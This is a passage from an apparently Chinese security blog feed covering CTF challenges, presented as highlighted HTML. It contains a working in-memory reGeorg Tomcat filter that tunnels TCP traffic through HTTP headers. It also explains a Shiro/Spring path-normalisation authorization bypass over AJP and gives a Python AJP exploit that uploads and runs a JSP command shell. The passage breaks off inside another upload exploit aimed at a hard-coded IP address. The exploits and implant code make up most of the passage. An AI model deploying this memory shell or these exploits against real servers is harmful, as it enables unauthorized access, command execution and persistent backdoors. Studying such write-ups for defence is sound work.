class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reGeorg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MemReGeorg</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.HttpServletRequest request = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> org.apache.catalina.connector.Response response = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.HttpSession session =<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request1, ServletResponse response1, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;</span><br><span class="line">        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;</span><br><span class="line">        javax.servlet.http.HttpSession session = request.getSession();</span><br><span class="line">        String cmd = request.getHeader(<span class="string">"X-CMD"</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">            response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd.compareTo(<span class="string">"CONNECT"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    String target = request.getHeader(<span class="string">"X-TARGET"</span>);</span><br><span class="line">                    <span class="keyword">int</span> port = Integer.parseInt(request.getHeader(<span class="string">"X-PORT"</span>));</span><br><span class="line">                    java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open();</span><br><span class="line">                    socketChannel.connect(<span class="keyword">new</span> java.net.InetSocketAddress(target, port));</span><br><span class="line">                    socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">                    session.setAttribute(<span class="string">"socket"</span>, socketChannel);</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.net.UnknownHostException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"DISCONNECT"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                session.invalidate();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"READ"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(<span class="number">512</span>);</span><br><span class="line">                    <span class="keyword">int</span> bytesRead = socketChannel.read(buf);</span><br><span class="line">                    ServletOutputStream so = response.getOutputStream();</span><br><span class="line">                    <span class="keyword">while</span> (bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        so.write(buf.array(),<span class="number">0</span>,bytesRead);</span><br><span class="line">                        so.flush();</span><br><span class="line">                        buf.clear();</span><br><span class="line">                        bytesRead = socketChannel.read(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                    so.flush();</span><br><span class="line">                    so.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">"FORWARD"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">"socket"</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">int</span> readlen = request.getContentLength();</span><br><span class="line">                    <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[readlen];</span><br><span class="line">                    request.getInputStream().read(buff, <span class="number">0</span>, readlen);</span><br><span class="line">                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen);</span><br><span class="line">                    buf.clear();</span><br><span class="line">                    buf.put(buff);</span><br><span class="line">                    buf.flip();</span><br><span class="line">                    <span class="keyword">while</span>(buf.hasRemaining()) &#123;</span><br><span class="line">                        socketChannel.write(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        Object[] context=(Object[]) obj;</span><br><span class="line">        <span class="keyword">this</span>.session = (javax.servlet.http.HttpSession ) context[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">this</span>.response = (org.apache.catalina.connector.Response) context[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">this</span>.request = (javax.servlet.http.HttpServletRequest) context[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            dynamicAddFilter(<span class="keyword">new</span> MemReGeorg(),<span class="string">"reGeorg"</span>,<span class="string">"/*"</span>,request);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dynamicAddFilter</span><span class="params">(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request)</span> <span class="keyword">throws</span> IllegalAccessException </span>&#123;</span><br><span class="line">        javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(name) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.lang.reflect.Field contextField = <span class="keyword">null</span>;</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext =<span class="keyword">null</span>;</span><br><span class="line">            org.apache.catalina.core.StandardContext standardContext=<span class="keyword">null</span>;</span><br><span class="line">            java.lang.reflect.Field stateField=<span class="keyword">null</span>;</span><br><span class="line">            javax.servlet.FilterRegistration.Dynamic filterRegistration =<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                filterRegistration = servletContext.addFilter(name, filter);</span><br><span class="line">                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,<span class="keyword">new</span> String[]&#123;url&#125;);</span><br><span class="line">                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");</span><br><span class="line">                filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                filterStartMethod.invoke(standardContext, <span class="keyword">null</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ajp越权的shiro-acl"><a href="#ajp越权的shiro-acl" class="headerlink" title="ajp越权的shiro acl"></a>ajp越权的shiro acl</h3><p>这一点后面的提示也给出来了，可以用<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately">how-to-detect-tomcat-ajp-lfi-more-accurately</a>提到的办法，也可以用我之前提交的<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately">SHIRO-760</a>。poc在issue里面已经给了，漏洞的demo环境在<a href="https://github.com/cL0und/srpingboot-shiro">我github</a>上可以找到，这里借这个机会分享一下当时挖掘的思路。</p><p>通过分析<a href="https://www.freebuf.com/vuls/231909.html">前人的文章</a>可以知道，我们可以知道在org.apache.shiro.web.util.WebUtils#getPathWithinApplication内部会对requestUri进行提取并交给patchMatches匹配以判断是否需要鉴权。<br><img src="1594001505206-b96ba60b-1607-4ff5-91d4-8d7ad1c551f7.png#align=left&display=inline&height=293&margin=%5Bobject%20Object%5D&name=image.png&originHeight=586&originWidth=1492&size=199627&status=done&style=none&width=746" alt="image.png"><br>多次步入后，可以看到具体的获取uri的实现是其中的getRequestUri。getRequestUri首先会获取javax.servlet.include.request_uri的值如果获取到了就不会进入 <code>if (uri == null)</code> 。<br><img src="1594001525231-a1227a7d-bdc1-477f-8f4c-4f84030bff82.png#align=left&display=inline&height=242&margin=%5Bobject%20Object%5D&name=image.png&originHeight=484&originWidth=1492&size=183925&status=done&style=none&width=746" alt="image.png"><br>而如果有师傅看过shiro上一次对越权的修复的话会发现，补丁是打在<code>if (uri == null)</code>中的，通过ajp控制<code>javax.servlet.include.request_uri</code>相当于绕过上一次的补丁点。<br><img src="1594001543733-534c473f-b23f-47f6-8449-dfc4a8a14f69.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=1492&size=139177&status=done&style=none&width=746" alt="image.png"><br>接着这里提取出来的uri<code>/;/admin/page</code>会进入decodeAndCleanUriString中进行清洗。decodeAndCleanUriString会取分号前的内容返回。<br><img src="1594001562448-3aaf5fc7-2aaa-4c45-a01e-990b3ab64cf1.png#align=left&display=inline&height=72&margin=%5Bobject%20Object%5D&name=image.png&originHeight=143&originWidth=1492&size=76386&status=done&style=none&width=746" alt="image.png"><br>在这里返回的就是<code>/</code>，后面shiro的正则<code>/admin/*</code>自然也就拦截不了。</p><p>此外，光绕过shiro还不行，spring不解析这条路由也没用，一个开始我也为用前人文章中的 <code>/xxxx;/../</code> 可以轻松绕过，黑盒发现并不行。分析ajp漏洞的时候我们知道，tomcat先调用对所有filter进行过滤然后会调用对应的servlet，而在spring都是统一由DispatcherServlet进行统一调度的。所以一开始我选择把断点打到org.springframework.web.servlet.FrameworkServlet#doGet（_DispatcherServlet继承FrameworkServlet_）。又因为spring是通过HandlerMapping来找对应的控制器，所以步入断点之后就开始找哪个地方有这个逻辑。最后在/org/springframework/web/servlet/DispatcherServlet.class:484找到。<br><img src="1594001660546-d8b7972b-9bb0-41cd-9b2c-37aa410d37d6.png#align=left&display=inline&height=391&margin=%5Bobject%20Object%5D&name=image.png&originHeight=782&originWidth=1492&size=329488&status=done&style=none&width=746" alt="image.png"><br>步入之后spring把已经注册过Mapping轮询一次。在代码中我们用的@GetMapping这里就对应ReuqestMappingHandlerMapping。<br><img src="1594001700248-56346a95-e72b-4a02-a020-7b80d006a673.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=1492&size=243393&status=done&style=none&width=746" alt="image.png"><br>步入ReuqestMappingHandlerMapping之后再多次步入，最后来到org.springframework.web.util.UrlPathHelper#getPathWithinApplication<br><img src="1594001720564-fc1f7a9c-b4ef-40ac-9601-f02cd5a74ee4.png#align=left&display=inline&height=163&margin=%5Bobject%20Object%5D&name=image.png&originHeight=325&originWidth=1492&size=183407&status=done&style=none&width=746" alt="image.png"><br>这里三个箭头是关键的三个点，第一个箭头会对uri提取并“消杀”，第二个箭头会去pathWithinApp中servletPath之后的内容。第三个箭头返回path交给HandlerMapping匹配。</p><p>我们先来看第一个箭头“消杀”的步骤。<br><img src="1594001748419-fe37e159-a3ac-4b7b-b5e2-2459cd4d7e54.png#align=left&display=inline&height=126&margin=%5Bobject%20Object%5D&name=image.png&originHeight=252&originWidth=1492&size=73032&status=done&style=none&width=746" alt="image.png"><br><img src="1594001754187-5c2a028f-f2c4-4846-9993-167ef84f4c21.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&name=image.png&originHeight=186&originWidth=1492&size=71193&status=done&style=none&width=746" alt="image.png"><br>上图removeSemicolonContent会移除uri中<code>;</code>，<code>/;/admin/page</code>变为<code>//admin/page</code>。getSanitizedPath会对移除重复的<code>/</code>， <code>//admin/page</code> 变为 <code>/admin/page</code> （_ps：这里并不会处理..及.这也是为啥老payload /xxx;/../无法用的原因，虽然可以绕过但是之后spring handlerMapping匹配不到。_）</p><p>再来第二个箭头，这个getRemainingPath会提取处Uri中conextPath之后的部分。举个反例如果我们把<code>javax.servlet.include.servlet_path</code>设置为<code>/</code>，那么返回给HandlerMapping将会是 <code>admin/page</code> ，而HandlerMapping只会匹配<code>/admin/page</code>这也是为什么<code>javax.servlet.include.servlet_path</code>需要置为空的原因。</p><p>回过头看漏洞本质还是在于spring和shiro在规范消杀url时标准不一致造成的问题。因为最新版的tomcat已经默认把ajp关了，并且在反代情况下tomcat 8009也不会对外开放所以这个洞的利用还是受很大限制的。</p><h3 id="ajp上传文件"><a href="#ajp上传文件" class="headerlink" title="ajp上传文件"></a>ajp上传文件</h3><p>因为网上ajp协议讨论较少，和exp有关的只有CVE-2020-1938，不过payload的构造比较单一并不涉及到上传文件的请求，网上应该也没有介绍相关的文章。那要怎么通过ajp传？我预想的思路是选手通过阅读相关类库来解决比如<a href="https://github.com/hypn0s/AJPy">AJPy</a>，在tomcat.py中提供了一种部署war包getshell的操作，这里面就有上传文件的操作，可以借鉴。<br><img src="1594002267067-acd0c056-d4bf-46f6-8187-192f0244dc41.png#align=left&display=inline&height=618&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1236&originWidth=2380&size=320042&status=done&style=none&width=1190" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> ajpy.ajp <span class="keyword">import</span> AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException</span><br><span class="line"><span class="keyword">from</span> tomcat <span class="keyword">import</span> Tomcat</span><br><span class="line"></span><br><span class="line">target_host = <span class="string">"127.0.0.1"</span></span><br><span class="line">gc = Tomcat(target_host, <span class="number">8009</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"shell.jpg"</span></span><br><span class="line">payload = <span class="string">"&lt;% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"cat /flag.txt\").getInputStream())).readLine()); %&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/tmp/request"</span>, <span class="string">"w+b"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s_form_header = <span class="string">'------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n'</span> % filename</span><br><span class="line">    s_form_footer = <span class="string">'\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'</span></span><br><span class="line">    f.write(s_form_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    f.write(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    f.write(s_form_footer.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">data_len = os.path.getsize(<span class="string">"/tmp/request"</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">"SC_REQ_CONTENT_TYPE"</span>: <span class="string">"multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti"</span>,</span><br><span class="line">        <span class="string">"SC_REQ_CONTENT_LENGTH"</span>: <span class="string">"%d"</span> % data_len,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/;/admin/upload"</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">    , &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, <span class="string">"/"</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">    , &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">""</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">, ]</span><br><span class="line"></span><br><span class="line">hdrs, data = gc.perform_request(<span class="string">"/"</span>, headers=headers, method=<span class="string">"POST"</span>,  attributes=attributes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/tmp/request"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    responses = br.send_and_receive(gc.socket, gc.stream)</span><br><span class="line"></span><br><span class="line">r = AjpResponse()</span><br><span class="line">r.parse(gc.stream)</span><br><span class="line"></span><br><span class="line">shell_path = r.data.decode(<span class="string">'utf-8'</span>).strip(<span class="string">'\x00'</span>).split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">50</span>)</span><br><span class="line">print(shell_path)</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">gc = Tomcat(<span class="string">'127.0.0.1'</span>, <span class="number">8009</span>)</span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, shell_path,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">]</span><br><span class="line">hdrs, data = gc.perform_request(<span class="string">"/uploads/1.jsp"</span>, attributes=attributes)</span><br><span class="line">output = sys.stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output.write(d.data.decode(<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        output.write(repr(d.data))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      发这篇文章的时候已经毕业快一月了，感谢Syclover老学长们和小伙伴的一路帮助，感谢相遇。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>De1tactf2020 pentest非预期解与预期解</title>
    <link href="http://yoursite.com/2020/05/05/De1tactf2020-pentest%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E9%A2%84%E6%9C%9F%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/05/05/De1tactf2020-pentest%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E9%A2%84%E6%9C%9F%E8%A7%A3/</id>
    <published>2020-05-05T09:13:40.000Z</published>
    <updated>2020-07-11T08:02:56.309Z</updated>
    
    <content type="html"><![CDATA[<!-- 把一些停留在理论认知上的高级攻击姿势全部操练了一遍，学到很多。 --><!-- more --><h2 id="pentest1"><a href="#pentest1" class="headerlink" title="pentest1"></a>pentest1</h2><p>先是一个有绕过的文件上传，这部分是其他小伙伴做的直接给exp了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://47.113.219.76/index.php'</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=----WebKitFormBoundaryhJUhA4FiLizuakBx'</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">"""------WebKitFormBoundaryhJUhA4FiLizuakBx</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="&#123;&#125;"</span></span><br><span class="line"><span class="string">Content-Type: image/jpeg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryhJUhA4FiLizuakBx</span></span><br><span class="line"><span 